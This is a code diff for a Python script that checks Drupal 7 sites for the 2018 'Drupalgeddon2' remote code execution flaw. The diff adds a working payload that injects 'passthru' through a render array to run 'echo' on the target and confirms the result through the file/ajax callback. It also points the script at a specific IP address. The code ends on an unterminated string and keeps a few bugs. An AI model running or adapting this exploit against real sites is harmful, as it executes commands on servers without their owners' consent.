@@ -7,46 +7,55 @@ def genSignature(size=6, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
 
 def isFormValid(host,version):
-	form_id = version[1:]=='7' ? 'user_pass : user_register'
+	form_id = 'user/password'  if version[:1]=='7' else 'user/register'
 	# check form with ?q
 	url = host + '?q=' +form_id
+	# print url
 	r = requests.get(url)
-	if (r == 200):
-		return true
+	if (r.status_code == 200):
+		return True
 	# check form without ?q
 	url = host +form_id
+	# print url
 	r = requests.get(url)
 	if (r == 200):
-		return true
+		return True
 
-	return false
+	return False
 
-def pwnAble_2018(host,version):
+def isPwnAble_2018(host,version):
 	signature = genSignature()
-	switch (version[1:]) :
-		case '7':
-			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': ' echo ' + signature}
-			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
-			r = requests.post(host, data=post_params, params=get_params, verify=False)
-			m = re.search(signature, r.text)
-			if m:
-				return true
-			else: 
-				return false
-		default:
-			break		
+	version = version[:1]
+	if version == '7':
+		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': ' echo ' + signature}
+		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
+		r = requests.post(host, data=post_params, params=get_params, verify=False)
+		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
+		if m:
+			found = m.group(1)
+			get_params = {'q':'file/ajax/name/#value/' + found}
+			post_params = {'form_build_id':found}
+			res = requests.post(host, data=post_params, params=get_params)
+			detect = re.search(signature, res.text)
+			if detect:
+				return True
+		else: 
+			return False
+	if version == '8':
+		return False
 
 def isVulnerable(host, version):
+	print 'Form Valid: ' , isFormValid(host,version)
+	if isFormValid(host,version) == False:
+		return False
 
-	if !isFormValid(host,version):
-		return false
+	if isPwnAble_2018(host,version) == False:
+		return False
 
-	if !pwnAble(host,version):
-		return false
-
-	return true
+	return True
 
 
-host = 'xxxx.xyz'
+host = 'http://68.183.237.96/'
 version ='7.2'
-print version[1:]
+if isVulnerable(host,version):
+	print " This site is vulnerable
